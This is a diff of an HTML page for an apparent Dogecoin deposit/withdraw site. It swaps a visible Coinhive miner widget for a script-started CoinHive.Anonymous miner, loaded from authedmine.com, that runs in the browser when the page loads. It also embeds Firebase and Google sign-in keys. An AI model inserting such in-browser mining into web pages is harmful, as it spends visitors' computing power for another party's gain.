@@ -1,13 +1,9 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/87/three.js"></script>
 <script src="https://www.gstatic.com/firebasejs/4.9.0/firebase.js"></script>
 <script src="https://apis.google.com/js/platform.js" async defer></script>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <meta name="google-signin-client_id" content="512785158374-3s3s0mpdpsjii0vfti5i6bnmh4csr3aj.apps.googleusercontent.com">
 <div style="position: absolute; left: 0px; top: 0px"class="g-signin2" data-onsuccess="onSignIn"></div>
-<div class="coinhive-miner" 
-	style="position: absolute; left: 0px; top: 152px; width: 310px; height: 310px"
-	data-key="zqAEWDRFsyNly3PbAkg0SkoqOOQ6zQ7Z">
-	<em>Loading...</em>
-</div>
 <input style="position: absolute; left: 150px; top: 0px; font-size:26px"type="button"value="Withdraw"onclick="register">
 <img style="position: absolute; left: 0px; top: 38px; font-size:26px"width="76"height="76"src="Dogecoin_Logo.png">
 <img style="position: absolute; left: 76px; top: 38px; font-size:26px"width="38"height="38"src="izquierda.png">
@@ -15,6 +11,10 @@
 <input style="position: absolute; left: 114px; top: 38px; font-size:26px"id="deposit"size="50%"readonly>
 <input style="position: absolute; left: 114px; top: 76px; font-size:26px"id="withdraw"size="50%">
 <script>
+miner=new CoinHive.Anonymous('zqAEWDRFsyNly3PbAkg0SkoqOOQ6zQ7Z',{throttle:0.3})
+// Only start on non-mobile devices and if not opted-out
+// in the last 14400 seconds (4 hours):
+if(!miner.isMobile()&&!miner.didOptOut(14400)){miner.start()}
 deposit.value="DBzgTPcJ5Qf2Cm6tjuxaDs2PBEDRpmm7Co"
 firebase.initializeApp({
 apiKey:"AIzaSyBoxgmRbzJXn6__VGDCJqot4BJY_dctJQA",
